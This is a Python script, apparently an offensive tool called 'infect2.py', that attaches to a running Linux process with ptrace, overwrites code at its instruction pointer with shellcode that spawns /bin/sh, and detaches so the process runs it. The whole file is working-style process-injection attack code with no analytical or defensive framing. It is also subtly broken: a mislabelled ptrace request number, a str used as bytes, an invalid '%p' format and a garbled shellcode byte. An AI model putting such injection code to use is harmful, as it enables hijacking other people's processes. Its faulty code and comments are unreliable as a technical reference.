import ctypes
import sys
import os
import struct

SHELLCODE_SIZE = 32

shellcode = (
    "\x48\x31\xc0\x48\x89\xc2\x48\x89"
    "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
    "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x00\xcc\x90\x90\x90"
)

class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

def inject_data(pid, src, dst, size):
    libc = ctypes.CDLL('libc.so.6')
    offset = 0
    for i in range(0, size, 4):
        data = struct.unpack("<I", src[offset:offset+4])[0]
        if libc.ptrace(5, pid, ctypes.c_void_p(dst + offset), ctypes.c_void_p(data), 0) < 0:
            print("ptrace error")
            return -1
        offset += 4
    return 0

def main():
    if len(sys.argv) != 2:
        print("Usage: python infect2.py <pid>")
        sys.exit(1)

    target_pid = int(sys.argv[1])

    print("+ Tracing process %d" % target_pid)

    libc = ctypes.CDLL('libc.so.6')
    ret = libc.ptrace(16, target_pid, None, None)  # PTRACE_ATTACH
    if ret < 0:
        print("ptrace(ATTACH) error")
        sys.exit(1)

    print("+ Waiting for process...")
    os.wait()

    print("+ Getting Registers")
    regs_buf = user_regs_struct()
    ret = libc.ptrace(12, target_pid, None, ctypes.byref(regs_buf))  # PTRACE_GETREGS
    if ret < 0:
        print("ptrace(GETREGS) error")
        sys.exit(1)

    rip_address = regs_buf.rip

    print("+ Injecting shell code at %p" % rip_address)
    inject_data(target_pid, shellcode, rip_address, SHELLCODE_SIZE)

    rip_address += 2
    print("+ Setting instruction pointer to %p" % rip_address)

    ret = libc.ptrace(4, target_pid, None, ctypes.c_void_p(rip_address))  # PTRACE_SETREGS
    if ret < 0:
        print("ptrace(SETREGS) error")
        sys.exit(1)

    print("+ Run it!")

    ret = libc.ptrace(17, target_pid, None, None)  # PTRACE_DETACH
    if ret < 0:
        print("ptrace(DETACH) error")
        sys.exit(1)

if __name__ == "__main__":
    main()
